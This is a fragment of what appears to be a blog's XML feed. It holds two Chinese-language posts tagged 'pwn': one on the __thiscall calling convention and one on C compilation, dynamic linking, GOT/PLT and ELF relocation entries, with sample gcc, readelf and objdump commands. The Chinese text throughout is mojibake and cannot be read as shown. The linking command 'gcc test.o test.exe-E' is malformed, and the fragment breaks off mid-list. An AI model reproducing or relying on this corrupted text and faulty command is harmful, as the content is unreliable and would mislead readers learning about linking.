title="__thiscall"></a>__thiscall</h2><p>__thiscallæ˜¯å”¯ä¸€ä¸€ä¸ªä¸èƒ½æ˜ç¡®æŒ‡æ˜çš„å‡½æ•°ä¿®é¥°ï¼Œå› ä¸ºthiscallåªèƒ½ç”¨äºC++ç±»æˆå‘˜å‡½æ•°çš„è°ƒç”¨ï¼ŒåŒæ—¶thiscallä¹Ÿæ˜¯C++æˆå‘˜å‡½æ•°ç¼ºçœçš„è°ƒç”¨çº¦å®šã€‚ç”±äºæˆå‘˜å‡½æ•°è°ƒç”¨è¿˜æœ‰ä¸€ä¸ªthisæŒ‡é’ˆï¼Œå› æ­¤å¿…é¡»ç‰¹æ®Šå¤„ç†ã€‚</p><h4 id="è°ƒç”¨æ–¹å¼-3"><a href="#è°ƒç”¨æ–¹å¼-3" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>é‡‡ç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå‚æ•°<strong>è‡ªå³å‘å·¦</strong>å…¥æ ˆ</li><li>å¦‚æœå‚æ•°çš„ä¸ªæ•°ç¡®å®šï¼ŒthisæŒ‡é’ˆé€šè¿‡ecxä¼ é€’ç»™è¢«è°ƒç”¨è€…ï¼›å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼ŒthisæŒ‡é’ˆåœ¨æ‰€æœ‰å‚æ•°å‹æ ˆåè¢«å‹å…¥å †æ ˆ</li><li>å¯¹äºå‚æ•°ä¸ªæ•°ä¸ç¡®å®šçš„ç”±è°ƒç”¨è€…é—®æ¸…ç†å †æ ˆï¼Œå¦åˆ™ç”±è¢«è°ƒå‡½æ•°æ¸…ç†ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŠ¨æ€é“¾æ¥GOTä¸PLT</title>
    <link href="/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/"/>
    <url>/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦æ˜¯åŠ¨æ€é“¾æ¥çš„ä¸€äº›å†…å®¹</p><span id="more"></span><p>æ–­æ–­ç»­ç»­ç£¨äº†ä¸€ä¸ªå‘¨ï¼Œæœ¬æ¥åªæ˜¯æƒ³å­¦ä¸€ä¸‹gotè¡¨åæ¥å‘ç°è¶ŠæŒ–è¶Šæ·±ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œå¤§è‡´äº†è§£ä¸€ä¸‹ï¼Œæœ€åå†™å‡ºäº†è¿™æ ·ä¸€ä¸ªç½‘ç»œåƒåœ¾ï¼ˆx</p><h1 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h1><p><strong>é“¾æ¥å°±æ˜¯æŠŠç›®æ ‡æ–‡ä»¶ä¸ä¸€äº›åº“æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚</strong></p><h3 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a>ç¼–è¯‘è¿‡ç¨‹</h3><p>è¦äº†è§£â€œé“¾æ¥â€çš„æ¦‚å¿µï¼Œé¦–å…ˆè¦äº†è§£Cè¯­è¨€ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ï¼š(1) é¢„å¤„ç†ï¼›(2) ç¼–è¯‘ï¼›(3) æ±‡ç¼–ï¼›(4) é“¾æ¥ï¼›</p><h5 id="01-é¢„å¤„ç†"><a href="#01-é¢„å¤„ç†" class="headerlink" title="01 é¢„å¤„ç†"></a>01 é¢„å¤„ç†</h5><p>ä½¿ç”¨é¢„å¤„ç†å™¨æŠŠæºæ–‡ä»¶<code>test.c</code>ç»è¿‡é¢„å¤„ç†ç”Ÿæˆ<code>test.i</code>æ–‡ä»¶ï¼Œé¢„å¤„ç†ç”¨äºå°†æ‰€æœ‰çš„<code>#include</code>å¤´æ–‡ä»¶ä»¥åŠå®å®šä¹‰æ›¿æ¢æˆå…¶çœŸæ­£çš„å†…å®¹ï¼Œå…¶ä¸­<code>test.i</code>æ˜¯æ–‡æœ¬æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªcè¯­è¨€çš„æºæ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&#x27;This is a test program!\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gccå¤„ç†å‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -E test.c -o test.i   #-Eæ˜¯è®©ç¼–è¯‘å™¨åœ¨é¢„å¤„ç†ä¹‹åå°±é€€å‡ºï¼Œä¸è¿›è¡Œåç»­ç¼–è¯‘è¿‡ç¨‹ï¼›-oæ˜¯æŒ‡å®šè¾“å‡ºæ–‡ä»¶åã€‚<br></code></pre></td></tr></table></figure><p>å¤„ç†åçš„test.iæ–‡ä»¶å°±ä¼šå˜å¾—å¾ˆé•¿å¾ˆé•¿ï¼Œä»¥ä¸‹æ˜¯éƒ¨åˆ†æˆªå›¾ï¼š</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-09-26.png"></p><h5 id="02-ç¼–è¯‘"><a href="#02-ç¼–è¯‘" class="headerlink" title="02 ç¼–è¯‘"></a>02 ç¼–è¯‘</h5><p>ä½¿ç”¨ç¼–è¯‘å™¨å°†é¢„å¤„ç†æ–‡ä»¶<code>test.i</code>ç¼–è¯‘æˆæ±‡ç¼–æ–‡ä»¶<code>test.s</code>ï¼Œå…¶ä¸­<code>test.s</code>æ˜¯æ–‡æœ¬æ–‡ä»¶ã€‚</p><p>gccå‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -S test.i -o test.s   #-Sè®©ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¹‹ååœæ­¢ï¼Œä¸è¿›è¡Œåç»­è¿‡ç¨‹ï¼›-oæ˜¯æŒ‡å®šè¾“å‡ºæ–‡ä»¶å<br></code></pre></td></tr></table></figure><p>å¤„ç†åçš„test.sæ–‡ä»¶åˆå˜å¾—çŸ­çŸ­çš„äº†</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-19-27.png"></p><h5 id="03-ç¼–è¯‘"><a href="#03-ç¼–è¯‘" class="headerlink" title="03 ç¼–è¯‘"></a>03 ç¼–è¯‘</h5><p>ä½¿ç”¨æ±‡ç¼–å™¨å°†æ±‡ç¼–æ–‡ä»¶<code>test.s</code>è½¬æ¢æˆç›®æ ‡æ–‡ä»¶<code>test.o</code>ï¼Œå…¶ä¸­<code>test.o</code>æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æ±‡ç¼–è¿‡ç¨‹çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -c test.s -o test.o   #-cè®©æ±‡ç¼–å™¨æŠŠæ±‡ç¼–æ–‡ä»¶test.sè½¬æ¢æˆç›®æ ‡æ–‡ä»¶test.oã€‚<br></code></pre></td></tr></table></figure><h5 id="04-é“¾æ¥"><a href="#04-é“¾æ¥" class="headerlink" title="04 é“¾æ¥"></a>04 é“¾æ¥</h5><p>é“¾æ¥è¿‡ç¨‹ä½¿ç”¨é“¾æ¥å™¨å°†è¯¥ç›®æ ‡æ–‡ä»¶ä¸å…¶ä»–ç›®æ ‡æ–‡ä»¶ã€åº“æ–‡ä»¶ã€å¯åŠ¨æ–‡ä»¶ç­‰é“¾æ¥èµ·æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>è¯¥æ­¥éª¤çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc test.o test.exe-E <br></code></pre></td></tr></table></figure><p>æ‹–è¿›IDAå°±æ˜¯æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„æ ·å­äº†</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-42-21.png"></p><h3 id="åŠ¨æ€é“¾æ¥åº“"><a href="#åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“"></a>åŠ¨æ€é“¾æ¥åº“</h3><p>æˆ‘ä»¬åœ¨å†™ç¨‹åºçš„æ—¶å€™ï¼Œé€šå¸¸ä¸ä¼šå®Œå…¨é è‡ªå·±æ¥å®ç°æ‰€æœ‰åŠŸèƒ½ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨æˆ‘ä»¬æ‰€éœ€è¦çš„ç³»ç»Ÿåº“æˆ–è€…ç¬¬ä¸‰æ–¹åº“æ¥å®ç°æˆ‘ä»¬çš„åŠŸèƒ½ï¼Œè¿™äº›åº“å°±æ˜¯åŠ¨æ€é“¾æ¥åº“ã€‚</p><blockquote><p>åŠ¨æ€é“¾æ¥åº“å¯ä»¥æ˜ å°„åˆ°ä¸åŒè¿›ç¨‹çš„ä¸åŒè™šæ‹Ÿåœ°å€ï¼Œæ‰€ä»¥å±äºâ€œåœ°å€æ— å…³ä»£ç â€ã€‚</p></blockquote><p>ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">strncpy</span>(buf, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç ä¸­æˆ‘ä»¬è°ƒç”¨äº†ç³»ç»Ÿåº“ï¼Œåœ¨ç¼–è¯‘å®Œæˆåå¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„symbolã€‚ä¼šå‘ç°åœ¨printfå’Œstrncpyå‰é¢éƒ½æ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œè¿™å°±æ˜¯ç”¨äºæ”¯æŒåŠ¨æ€è¿æ¥åŠŸèƒ½çš„ã€‚</p><blockquote><p>ä¸¤ç§å‘½ä»¤å¯ä»¥éšæ„æŒ‘é€‰ï¼Œä½†ç»“æœä¸å¤ªä¸€æ ·ï¼Œè¿˜æ²¡ææ˜ç™½ğŸ˜³</p><p><code>nm -g [filename]</code></p><p><code>readelf  -s [filename]</code></p></blockquote><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_18-30-06.png"></p><p>é€šè¿‡objdumpå‘½ä»¤æŸ¥çœ‹ç›¸å…³å‡½æ•°çš„åæ±‡ç¼–æ¨¡å— <code>objdump -D [filename]</code>ï¼ˆåœ¨.pltéƒ¨åˆ†ï¼‰</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_21-05-57.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºé¦–å…ˆè¿›è¡Œjupqæ“ä½œè·³è½¬åˆ°ç›¸åº”çš„ä»£ç æ®µï¼Œè¿™ä¸ªä»£ç æ®µå°±æ˜¯ç”¨äºç»™â€œåœ°å€æ— å…³ä»£ç â€åšåŠ¨æ€åœ°å€é‡å®šä½ï¼Œé“¾æ¥å™¨å°†è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ä»£ç è·³è½¬åˆ°ç¨‹åºè¿è¡Œæ—¶çš„åŠ¨æ€è£…è½½åœ°å€ã€‚</p><h3 id="é“¾æ¥å™¨"><a href="#é“¾æ¥å™¨" class="headerlink" title="é“¾æ¥å™¨"></a>é“¾æ¥å™¨</h3><p>é“¾æ¥å™¨ï¼ˆLinkerï¼‰æ˜¯ä¸€ä¸ªç¨‹åºï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªç”±ç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶å¤–åŠ åº“é“¾æ¥ä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ç›®æ ‡æ–‡ä»¶æ˜¯åŒ…æ‹¬æœºå™¨ç å’Œé“¾æ¥å™¨å¯ç”¨ä¿¡æ¯çš„ç¨‹åºæ¨¡å—ã€‚</p><p>ç®€å•çš„è®²ï¼Œ<strong>é“¾æ¥å™¨çš„å·¥ä½œå°±æ˜¯è§£ææœªå®šä¹‰çš„ç¬¦å·å¼•ç”¨ï¼Œå°†ç›®æ ‡æ–‡ä»¶ä¸­çš„å ä½ç¬¦æ›¿æ¢ä¸ºç¬¦å·çš„åœ°å€</strong>ã€‚</p><p>é“¾æ¥å™¨è¿˜è¦å®Œæˆç¨‹åºä¸­å„ç›®æ ‡æ–‡ä»¶çš„åœ°å€ç©ºé—´çš„ç»„ç»‡ï¼Œæ¶‰åŠé‡å®šä½å·¥ä½œã€‚</p><h5 id="é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤"><a href="#é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤" class="headerlink" title="é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤"></a>é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤</h5><ul><li>å°†ä»£ç å’Œæ•°æ®æ¨¡å—è±¡å¾æ€§åœ°æ”¾å…¥å†…å­˜</li><li>å†³å®šæ•°æ®å’ŒæŒ‡ä»¤æ ‡ç­¾çš„åœ°å€</li><li>ä¿®è¡¥å†…éƒ¨å’Œå¤–éƒ¨å¼•ç”¨</li></ul><h5 id="é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…"><a href="#é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…" class="headerlink" title="é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…"></a>é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…</h5><ul><li>é“¾æ¥åº“åœ¨å°†ç›®æ ‡æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶çš„çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æŸä¸€ä¸ªå˜é‡æˆ–è€…å‡½æ•°åœ¨ç›®æ ‡ä¸­æ‰¾ä¸åˆ°ï¼Œå°±ä¼šæŒ‰ç…§ gcc é¢„å®šä¹‰çš„åŠ¨æ€åº“å¯»æ‰¾åŠ¨æ€åº“ä¸­å®šä¹‰çš„å˜é‡æˆ–è€…å‡½æ•°</li><li>å¦‚æœé“¾æ¥åº“åœ¨æŸä¸€åŠ¨æ€åº“ä¸­æ‰¾åˆ°äº†è¯¥å˜é‡æˆ–è€…å‡½æ•°çš„å®šä¹‰ï¼Œé“¾æ¥åº“é¦–å…ˆä¼šæŠŠè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“å†™åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ä¾èµ–åº“ä¸­ï¼Œç„¶åç”Ÿæˆè¿™ä¸ªå½“å‰å˜é‡æˆ–è€…å‡½æ•°çš„ä»£ç†symbol</li><li>åœ¨åç§»è¡¨ä¸­ç”ŸæˆçœŸæ­£çš„åŠ¨æ€è·³è½¬æŒ‡ä»¤ï¼Œå¹¶ä¸”åœ¨åº“å‡½æ•°ä»£ç†symbolä¸­è·³è½¬åˆ°ç›¸åº”çš„åç§»ä½ç½®</li></ul><h3 id="é‡å®šä½"><a href="#é‡å®šä½" class="headerlink" title="é‡å®šä½"></a>é‡å®šä½</h3><p>é‡å®šä½ï¼ˆRelocationsï¼‰å°±æ˜¯æŠŠç¨‹åºçš„é€»è¾‘åœ°å€å˜æ¢æˆä¸ºå†…å­˜ä¸­çš„å®é™…åœ°å€ç©ºé—´çš„è¿‡ç¨‹ã€‚</p><p>é‡å®šä½åˆ†ä¸ºä¸¤æ­¥ï¼š</p><ul><li>é‡å®šä½èŠ‚å’Œç¬¦å·å¼•ç”¨</li></ul><p>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œè¿æ¥å™¨å°†æ‰€æœ‰ç›¸åŒç±»å‹çš„èŠ‚åˆå¹¶ä¸ºåŒä¸€ç±»å‹çš„æ–°èšèŠ‚ã€‚éšåé“¾æ¥å™¨æŠŠè¿è¡Œæ—¶çš„å†…å­˜èµ‹å€¼ç»™æ–°çš„èšåˆèŠ‚ï¼Œèµ‹ç»™è¾“å…¥æ¨¡å—å®šä¹‰çš„æ¯ä¸ªèŠ‚ï¼Œä»¥åŠèµ‹ç»™è¾“å…¥æ¨¡å—çš„æ¯ä¸ªç¬¦å·ã€‚</p><blockquote><p>e.g.æ‰€æœ‰è¾“å…¥æ¨¡å—çš„.dataèŠ‚è¢«åˆå¹¶ä¸ºä¸€ä¸ªèŠ‚ï¼Œè¿™ä¸ªèŠ‚æˆä¸ºè¾“å…¥çš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„.dataèŠ‚ã€‚</p></blockquote><p>å½“è¿™ä¸€æ­¥å®Œæˆï¼Œç¨‹åºä¸­çš„æ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶çš„å†…å­˜åœ°å€äº†ã€‚</p><ul><li>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨</li></ul><p>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé“¾æ¥å™¨ä¿®æ”¹ä»£ç èŠ‚å’Œæ•°æ®èŠ‚ä¸­å¯¹æ¯ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—ä»–ä»¬æŒ‡å‘æ­£ç¡®çš„è¿è¡Œåœ°å€ã€‚</p><p>å…¶ä¸­ï¼Œé“¾æ¥å™¨æ‰§è¡Œè¿™ä¸€æ­¥éœ€è¦ä¾é å¯é‡å®šä½ç›®æ ‡æ¨¡å—ä¸­æˆä¸º<strong>é‡å®šä½æ¡ç›®</strong>çš„æ•°æ®ç»“æ„ã€‚</p><h5 id="é‡å®šä½æ¡ç›®"><a href="#é‡å®šä½æ¡ç›®" class="headerlink" title="é‡å®šä½æ¡ç›®"></a>é‡å®šä½æ¡ç›®</h5><p>å½“æ±‡ç¼–å™¨ç”Ÿæˆä¸€ä¸ªç›®æ ‡æ¨¡å—æ—¶ï¼Œä»–å¹¶ä¸çŸ¥é“æ•°æ®å’Œä»£ç æœ€ç»ˆä¼šè¢«æ”¾åœ¨å†…å­˜çš„é‚£ä¸ªä½ç½®ï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªæ¨¡å—å¼•ç”¨çš„å¤–éƒ¨å®šä¹‰çš„å‡½æ•°æˆ–è€…å…¨å±€å˜é‡çš„ä½ç½®ã€‚æ‰€ä»¥ï¼Œå½“æ±‡ç¼–å™¨é‡åˆ°ä¸€ä¸ªå¯¹æœ€ç»ˆä½ç½®æœªçŸ¥çš„ç›®æ ‡å¼•ç”¨ï¼Œå®ƒå°±ä¼šç”Ÿæˆä¸€ä¸ªé‡å®šä½æ¡ç›®ï¼Œå‘Šè¯‰è¿æ¥å™¨å°†ç›®æ ‡æ–‡ä»¶åˆå¹¶æˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶å¦‚ä½•ä¿®æ”¹è¿™ä¸ªå¼•ç”¨ã€‚</p><p>ä»£ç çš„é‡å®šä½æ¡ç›®æ”¾åœ¨<code>.rel.text</code>ä¸­ï¼Œå·²ç»åˆå§‹åŒ–æ•°æ®çš„é‡å®šä½æ¡ç›®æ”¾åœ¨<code>.rel.data</code>ä¸­ã€‚</p><p>é‡å®šä½æ¡ç›®åˆ†ä¸ºä¸¤ç§æ ¼å¼ï¼š<code>Rel</code>å’Œ<code>Rela</code>ã€‚æ¯ä¸ªé‡å®šä½æ¡ç›®è¡¨ç¤ºä¸€ä¸ªå¿…é¡»è¢«é‡å®šä½çš„ç¬¦å·å¼•ç”¨ï¼Œå¹¶æŒ‡æ˜å¦‚ä½•è®¡ç®—è¢«ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨ã€‚</p><blockquote><p>é‡å®šä½æ¡ç›®<code>Rel</code>å’Œ<code>Rela</code>ä¹‹é—´çš„å”¯ä¸€åŒºåˆ«ï¼š<code>Rel</code>ä¸­æ²¡æœ‰<code>Addend</code>å­—æ®µã€‚</p></blockquote><p>æŸ¥çœ‹æ–‡ä»¶ä¸­çš„é‡å®šä½ä¿¡æ¯ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">readelf -r [filename]<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-12_21-32-29.png"></p><ul><li><p><code>Offset</code>æ˜¯ Relocation Entry ç»“æ„ä½“ä¸­çš„ç¬¬ 1 ä¸ªå­—æ®µï¼Œå ç”¨ 8 å­—èŠ‚ï¼Œè¡¨ç¤º<strong>éœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨çš„ä½ç½®</strong>ã€‚</p><ul><li><p>å¯¹äºå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œè¯¥å­—æ®µè¡¨ç¤ºéœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨çš„èµ·å§‹ä½ç½®åœ¨ç›®æ ‡ section ï¼ˆ<code>.rela.text</code>ä¸­çš„é‡å®šä½æ¡ç›®å¯¹åº”çš„ç›®æ ‡ section ä¸º<code>.text</code>ï¼Œ<code>.rela.data</code>ä¸­çš„é‡å®šä½æ¡ç›®å¯¹åº”çš„ç›®æ ‡ section ä¸º<code>.data</code>ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ä¸­çš„åç§»é‡ï¼ˆå­—èŠ‚ï¼‰ã€‚</p></li><li><p>å¯¹äºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶å’Œå¯å…±äº«ç›®æ ‡æ–‡ä»¶ï¼Œè¯¥å­—æ®µè¡¨ç¤ºéœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨çš„èµ·å§‹ä½ç½®æ‰€å¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€‚</p></li></ul></li><li><p><code>Info</code>æ˜¯ Relocation Entry ç»“æ„ä½“ä¸­çš„ç¬¬ 2 ä¸ªå­—æ®µï¼Œå ç”¨ 8 å­—èŠ‚ï¼Œè¡¨ç¤º<strong>ç¬¦å·è¡¨ç´¢å¼•å’Œé‡å®šä½ç±»å‹</strong>ï¼ˆç¬¦å·è¡¨ç´¢å¼•å ç”¨é«˜ 32 ä½ï¼Œé‡å®šä½ç±»å‹å ç”¨ä½ 32 ä½ï¼‰ã€‚</p><ul><li><p>ç¬¦å·è¡¨ç´¢å¼•è¡¨ç¤ºéœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨åœ¨<code>.symtab</code>sectionä¸­çš„ç´¢å¼•ã€‚è¿™é‡Œçš„<code>Sym. Value</code>å’Œ<code>Sym. Name</code>åˆ—åªæ˜¯æ‰“å°äº†æ‰€å¯¹åº”ç¬¦å·è¡¨æ¡ç›®ä¸­<code>Value</code>å’Œ<code>Name</code>åˆ—çš„å€¼ã€‚</p></li><li><p>é‡å®šä½ç±»å‹æŒ‡ç¤ºé“¾æ¥å™¨å¦‚ä½•ä¿®æ”¹è¯¥ç¬¦å·å¼•ç”¨çš„å€¼ã€‚é‡å®šä½ç±»å‹å› ä¸åŒçš„å¤„ç†å™¨è€Œå¼‚ã€‚</p></li></ul></li><li><p><code>Addend</code>æ˜¯ Relocation Entry ç»“æ„ä½“ä¸­çš„ç¬¬ 3 ä¸ªå­—æ®µï¼Œå ç”¨ 8 å­—èŠ‚ï¼Œè¡¨ç¤ºä¸€ä¸ªæœ‰ç¬¦å·å¸¸æ•°ï¼Œä¸€äº›é‡å®šä½ç±»å‹è¦ä½¿ç”¨å®ƒå¯¹è¢«ä¿®æ”¹ç¬¦å·å¼•ç”¨çš„å€¼åš<strong>åç§»è°ƒæ•´</strong>ã€‚</p></li></ul><h1 id="é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥"></a>é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥</h1><h4 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h4><blockquote><p>é™æ€é“¾æ¥æ˜¯ç”±é“¾æ¥å™¨åœ¨é“¾æ¥æ—¶å°†åº“çš„å†…å®¹åŠ å…¥åˆ°å¯æ‰§è¡Œç¨‹åºä¸­çš„åšæ³•ã€‚é“¾æ¥å™¨æ˜¯ä¸€ä¸ªç‹¬ç«‹ç¨‹åºï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªåº“æˆ–ç›®æ ‡æ–‡ä»¶ï¼ˆå…ˆå‰ç”±ç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ç”Ÿæˆé“¾æ¥åˆ°ä¸€å—ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºã€‚è¿™é‡Œçš„åº“æŒ‡çš„æ˜¯é™æ€é“¾æ¥åº“ï¼ŒWindowsä¸‹ä»¥<code>.lib</code>ä¸ºåç¼€ï¼ŒLinuxä¸‹ä»¥<code>.a</code>ä¸ºåç¼€ã€‚</p></blockquote><p>è‹¥ç¨‹åºä½¿ç”¨é™æ€é“¾æ¥æ–¹å¼ï¼Œåˆ™ç¨‹åºæ‰€æœ‰ä»£ç éƒ½å°†é›†æˆåˆ°åŒä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œå…¶ä¼˜ç‚¹åœ¨äºæ— ä¾èµ–å…³ç³»ï¼Œå¯ä»¥åœ¨ä¸åŒè¿è¡Œç¯å¢ƒçš„OSä¸‹è¿è¡Œã€‚</p><p>ä½†æ˜¯ç¼ºç‚¹ä¹Ÿååˆ†æ˜æ˜¾ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­åŒ…å«å…¨éƒ¨ä»£ç ï¼Œæ‰€ä»¥æ‰€å ç©ºé—´è¾ƒå¤§ï¼›å¦‚æœå¤šæ¬¡è¿è¡ŒåŒä¸€ä¸ªç¨‹åºï¼Œåˆ™OSå¯èƒ½ä¼šå¯¹æŸä¸ªåº“å‡½æ•°è¿›è¡Œå¤šæ¬¡é‡å¤ çš„åŠ è½½ï¼Œå ç”¨äº†ä¸å¿…è¦çš„å†…å­˜ï¼›è‹¥æŸä¸ªå…¬ç”¨çš„åº“å‡½æ•°äº§ç”Ÿäº†æ›´æ–°ï¼Œåˆ™éœ€è¦é‡æ–°ç¼–è¯‘æ‰€æœ‰ä½¿ç”¨äº†è¯¥åº“çš„ç¨‹åºï¼Œå·¥ä½œé‡è¾ƒå¤§ã€‚</p><h5 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><ul><li>ä»£ç 